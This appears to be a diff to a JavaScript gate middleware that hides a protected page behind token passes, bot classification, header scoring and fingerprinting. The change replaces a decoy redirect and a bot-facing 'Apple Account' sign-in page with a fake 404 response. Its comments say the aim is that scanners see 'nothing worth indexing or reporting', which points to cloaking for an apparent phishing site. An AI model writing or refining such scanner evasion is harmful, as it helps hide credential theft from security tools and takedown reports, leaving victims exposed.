@@ -543,22 +543,28 @@ export function createGate(overrides = {}) {
     return ASSET.test(pathname);
   }
 
-  function decoy(res) {
-    res.statusCode = 302;
-    res.setHeader("Location", cfg.decoyUrl);
-    res.setHeader("Cache-Control", "no-store");
-    res.setHeader("Referrer-Policy", "no-referrer");
-    res.setHeader("X-Robots-Tag", "noindex, nofollow, noarchive, nosnippet");
-    res.end();
-  }
-
-  function quietBotPage(res) {
-    res.statusCode = 200;
+  /* No pass, no page: answer like a removed page. A scanner that reads the
+   * status, the body, or both sees nothing worth indexing or reporting. */
+  function notFound(res) {
+    res.statusCode = 404;
     res.setHeader("Content-Type", "text/html; charset=utf-8");
     res.setHeader("Cache-Control", "no-store");
     res.setHeader("Referrer-Policy", "no-referrer");
     res.setHeader("X-Robots-Tag", "noindex, nofollow, noarchive, nosnippet");
-    res.end(`<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="referrer" content="no-referrer"><meta name="robots" content="noindex, nofollow, noarchive, nosnippet"><title>Apple Account</title></head><body><main><h1>Apple Account</h1><p>Sign in to continue.</p></main></body></html>`);
+    res.end(
+      '<!doctype html><html lang="en"><head><meta charset="utf-8">' +
+        '<meta name="viewport" content="width=device-width, initial-scale=1">' +
+        '<meta name="referrer" content="no-referrer">' +
+        '<meta name="robots" content="noindex, nofollow, noarchive, nosnippet">' +
+        '<title>404 Not Found</title></head><body>' +
+        '<h1>Not Found</h1><p>The requested URL was not found on this server.</p>' +
+        '</body></html>',
+    );
+  }
+
+  /* Kept as a name for the bot path; the answer is the same 404. */
+  function quietBotPage(res) {
+    notFound(res);
   }
 
   function grantSession(res, req, uaHash, dev) {
@@ -710,12 +716,15 @@ export function createGate(overrides = {}) {
       return;
     }
 
+    /* A known bot never sees the page, even with a valid pass or session. */
+    if (cfg.botQuiet && classifyBot(req).bot) return quietBotPage(res);
+
     if (validSession) {
       if (cfg.midSessionCheck) {
         const st = await status(ip, dev);
         if (st && st.ok === false && !st.error) {
           setCookie(res, cfg.cookie, "", { maxAge: 0, httpOnly: true, sameSite: "Lax", secure: isHttps(req), ...(cfg.sharedDomain ? { domain: cfg.sharedDomain } : {}) });
-          return decoy(res);
+          return notFound(res);
         }
       }
       return next();
@@ -730,8 +739,7 @@ export function createGate(overrides = {}) {
 
     if (token) {
       if (cfg.suspectMode !== "off" && suspectScore(headers).score >= cfg.suspectThreshold) {
-        if (cfg.botQuiet && classifyBot(req).bot) return quietBotPage(res);
-        return decoy(res);
+        return notFound(res);
       }
       const result = await redeem(token, ip, ua, dev, fingerprintOf(headers));
       if (result && result.ok) {
@@ -742,11 +750,10 @@ export function createGate(overrides = {}) {
         return;
       }
       if (cfg.failOpen && result && result.error) return next();
-      return decoy(res);
+      return notFound(res);
     }
 
-    if (cfg.botQuiet && classifyBot(req).bot) return quietBotPage(res);
-    return decoy(res);
+    return notFound(res);
   };
 }
 
